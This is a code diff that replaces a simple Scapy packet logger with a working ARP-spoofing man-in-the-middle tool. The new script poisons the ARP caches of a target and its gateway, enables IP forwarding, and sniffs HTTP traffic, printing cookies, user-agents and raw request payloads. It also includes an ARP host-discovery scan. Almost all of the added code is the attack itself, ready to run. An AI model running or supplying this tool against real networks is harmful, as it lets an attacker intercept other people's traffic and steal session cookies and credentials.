@@ -1,120 +1,168 @@
-#Importing the necessary modules
-import logging
-from datetime import datetime
-import subprocess
+import scapy.all as scapy
+import scapy.layers.http as http
+from scapy.all import ARP, Ether, srp
 import sys
+import argparse
+from rich import print
+from rich.console import Console
+from rich.table import Table
+import os
 
-#This will supress all messages that have less significance
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-logging.getLogger("scapy.interactive").setLevel(logging.ERROR)
-logging.getLogger("scapy.loading").setLevel(logging.ERROR)
+console = Console()
+
+def get_mac(ip):
+    arp_request = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast / arp_request
+    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+
+    if answered_list:
+        return answered_list[0][1].hwsrc
+    else:
+        return None
+
+
+def arp_spoof(target_ip, spoof_ip):
+    target_mac = get_mac(target_ip)
+    if target_mac is None:
+        print(f"[bold red]Error:[/] Could not find MAC address for target IP: {target_ip}")
+        sys.exit(1)
+
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+
+def forward_packet(packet, target_ip, gateway_ip):
+    # Hedef IP ve Gateway IP'ye yönlendirme
+    if packet[scapy.IP].src == target_ip:
+        packet[scapy.IP].dst = gateway_ip
+    elif packet[scapy.IP].dst == gateway_ip:
+        packet[scapy.IP].dst = target_ip
+    scapy.send(packet, verbose=False)
+
+def sniff_packets(interface, target_ip, gateway_ip, method=None):
+    try:
+        scapy.sniff(iface=interface, store=False, prn=lambda packet: process_packet(packet, target_ip, gateway_ip, method))
+    except OSError as e:
+        print(f"[bold red]Error:[/] {e}")
+        sys.exit(1)
+
+def process_packet(packet, target_ip, gateway_ip, method=None):
+    if packet.haslayer(http.HTTPRequest):
+        request = packet[http.HTTPRequest]
+
+        # IP adresi ve MAC adresini al
+        ip = packet[scapy.IP].src
+        mac = packet[scapy.Ether].src
+
+        if method and request.Method.decode() != method:
+            return
+
+        print("\n[bold blue]HTTP Request:")
+        print(f"    Method: [green]{request.Method}[/green]")
+        print(f"    Host: [green]{request.Host}[/green]")
+        print(f"    Path: [green]{request.Path}[/green]")
+        print(f"    Source IP: [green]{ip}[/green]")
+        print(f"    Source MAC: [green]{mac}[/green]")
+        if request.Path.startswith(b"https"):
+            print(f"    Protocol: [green]HTTPS[/green]")
+        else:
+            print(f"    Protocol: [green]HTTP[/green]")
+
+        if request.Cookie:
+            print(f"    Cookie: [green]{request.Cookie}[/green]")
+
+        if request.User_Agent:
+            print(f"    User-Agent: [green]{request.User_Agent}[/green]")
+        if packet.haslayer(scapy.Raw):
+            print("\n[bold red]Raw Payload:")
+            payload = packet[scapy.Raw].load
+            print(f"[red]{payload}[/red]")
+
+    if packet.haslayer(http.HTTPResponse):
+        response = packet[http.HTTPResponse]
+
+        print("\n[bold blue]HTTP Response:")
+        print(f"    Status Code: [green]{response.Status_Code}[/green]")
+        print(f"    Content Type: [green]{response.Content_Type}[/green]")
+        print("\n" + "-"*90)
+
+
+def scan(target, iface):
+    arp = ARP(pdst=target)
+    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
+    packet = ether / arp
+    try:
+        result = srp(packet, timeout=3, verbose=0, iface=iface)[0]
+    except PermissionError:
+        print("[bold red]Error:[/] You do not have sufficient privileges. Try running the program with 'sudo'.")
+        exit()
+    except OSError as e:
+        if "No such device" in str(e):
+            print(f"[bold red]Error:[/] Interface '{iface}' does not exist. \nPlease provide a valid interface name.")
+            exit()
+        else:
+            raise
+
+    devices = []
+    for sent, received in result:
+        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
+
+    return devices
+
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-t", "--target", dest="target_ip", help="Target IP address")
+    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Gateway IP address")
+    parser.add_argument("-i", "--interface", dest="interface", help="Interface name")
+    parser.add_argument("-tf", "--targetfind", dest="target_find", help="Target IP range to find")
+    parser.add_argument("--ip-forward", "-if", action="store_true", help="Enable packet forwarding")
+    parser.add_argument("-m", "--method", dest="method", help="Limit sniffing to a specific HTTP method")
+    options = parser.parse_args()
+
+    if options.target_find:
+        ip_list = scan(options.target_find, options.interface)
+        print("\n[bold green]Device discovery")
+        print("\n[red]**************************************[/red]")
+        print("[blue]   Ip Address\t    Mac Address[/blue]")
+        print("[red]**************************************[/red]")
+        for ip in ip_list:
+            print(f"    [green]{ip['ip']}[/green]\t  {ip['mac']}")
+        print()
+        sys.exit(0)
+
+    if not options.target_ip:
+        parser.error("[-] Please specify a target IP address using -t or --target.")
+    if not options.gateway_ip:
+        parser.error("[-] Please specify a gateway IP address using -g or --gateway.")
+    if not options.interface:
+        parser.error("[-] Please specify the interface name using -i or --interface.")
+
+    # Paket yönlendirme özelliğini etkinleştir
+    if options.ip_forward:
+        os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")
+
+    return options
+
+options = main()
+target_ip = options.target_ip
+gateway_ip = options.gateway_ip
+interface = options.interface
+method = options.method
+
 
 try:
-    from scapy.all import *
-
-except ImportError:
-    print("Scapy package for Python is not installed on your system.")
-    sys.exit()
-    
-#Printing a message to the user; always use "sudo scapy" in Linux!
-print("\n! Make sure to run this program as ROOT !\n")
-
-#Asking the user for some parameters: interface on which sniff, the number of packets to sniff, the time interval to sniff, the protocol
-
-#Asking the user for input - the interface on which to run the sniffer
-net_iface = input("* Enter the interface on which to run the sniffer (e.g. 'eth0'): ")
-
-#Setting network interface in promiscuous mode
-'''
-Wikipedia: In computer  networking, promiscuous mode or "promisc mode"[1] is a mode for a wired network 
-interface controller (NIC) or wireless network interface controller (WNIC) that causes the controller to
-pass all traffic it receives to the central processing unit (CPU) rather than passing only the frames 
-that the controller is interned to receive.
-This mode is normally used for packet sniffing that takes place on a router or on a computer connected to a hub.
-'''
-try:
-    subprocess.call(["ifconfig", net_iface, "promisc"], stdout = None, stderr = None, shell = False)
- 
-except:
-    print("\nFailed to configure interface as promiscuous.\n")
-
-else:
-    #Executed if the try clause does not raise an exception
-    print("\nInterface %s was set to PROMISC mode.\n" % net_iface)
-    
-#APPLICATION #Part 2
-    
-#Asking the user for the number of packets to sniff (the "count" parameter)
-pkt_to_sniff = input("* Enter the number of packets to capture (0 is infinity): ")
-
-#Consider the case when user enters 0 (infinity)
-if int(pkt_to_sniff) != 0:
-    print("\nThe program will capture %d packets.\n" % int(pkt_to_sniff))
-    
-elif int(pkt_to_sniff) == 0:
-    print("\nThe program will capture packets until the timeout expires.\n")
-    
-#Asking the user for the time interval to sniff (the "timeout" paramter)
-time_to_sniff = input("* Enter the number of seconds to run the capture: ")
-
-#Handling the value entered by the user
-if int(time_to_sniff) != 0:
-    print("\nThe program will capture packets for %d seconds.\n" % int(time_to_sniff))
-    
-#Asking the user for any protocol filter he might want to apply to the sniffing process
-#For this example I chose three protocols: ARP, BOOTP, ICMP
-#You can customize this to add your own desired protocols
-proto_sniff = input("* Enter the protocol to filter by (arp|bootp|icmp|0 is all): ")
-
-#Considering the case when the user enters 0 (meaning all protocols)
-if (proto_sniff == "arp") or (proto_sniff == "bootp") or (proto_sniff == "icmp"):
-    print("\nThe program will capture only %s packets.\n" % proto_sniff.upper())
-   
-elif (proto_sniff) == "0":
-    print("\nThe program will capture all protocols.\n")
-
-#Asking the user to enter the name and path of the log file to be created
-file_name = input("* Please give a name to the log file: ")
-
-#Creating the text file (if it doesn't exist) for packet logging and/or opening it for appending
-sniffer_log = open(file_name, "a")
-
-
-#APPLICATION #Part 3
-#This is the function that will be called for each captured packet
-#The function will extract parameters from the packet and then log each packet to the log file
-def packet_log(packet):
-    
-    #Getting the current timestamp
-    now = datetime.now()
-    
-    #Writing the packet information to the log file, also considering the protocol or 0 fo all protocols
-    if proto_sniff == "0":
-        #Writing the data to the log file
-        print("Time: " + str(now) + " Protocol: ALL" + " SMAC: " + packet[0].src + " DMAC: " + packet[0].dst, file = sniffer_log)
-        
-    elif (proto_sniff == "arp") or (proto_sniff == "bootp") or (proto_sniff == "icmp"):
-        #Writing the data to the log file
-        print("Time: " + str(now) + " Protocol: " + proto_sniff.upper() + " SMAC: " + packet[0].src + " DMAC: " + packet[0].dst, file = sniffer_log)
-
-#Printing an informational message to the screen
-print("\n* Starting the capture...")
-
-#Running the sniffing process (with or without a filter)
-if proto_sniff == "0":
-    sniff(iface = net_iface, count = int(pkt_to_sniff), timeout = int(time_to_sniff), prn = packet_log)
-    
-elif (proto_sniff == "arp") or (proto_sniff == "bootp") or (proto_sniff == "icmp"):
-    sniff(iface = net_iface, filter = proto_sniff, count = int(pkt_to_sniff), timeout = int(time_to_sniff), prn = packet_log)
-    
-else:
-    print("\nCould not identify the protocol.\n")
-    sys.exit()
-
-#Printing the closing message
-print("\n* Please check the %s file to see the captured packets.\n" % file_name)
-
-#Closing the log file
-sniffer_log.close()
-
-#End of the program
+    while True:
+        arp_spoof(target_ip, gateway_ip)
+        arp_spoof(gateway_ip, target_ip)
+        print("******************* started sniff *******************")
+        sniff_packets(interface, target_ip, gateway_ip, method)
+except KeyboardInterrupt:
+    print("\n[bold green]Detected Ctrl+C. Resetting ARP tables...")
+    # Yönlendirme tablolarını sıfırla
+    arp_spoof(gateway_ip, target_ip)
+    arp_spoof(target_ip, gateway_ip)
+    sys.exit(0)
+print("See you later honey")
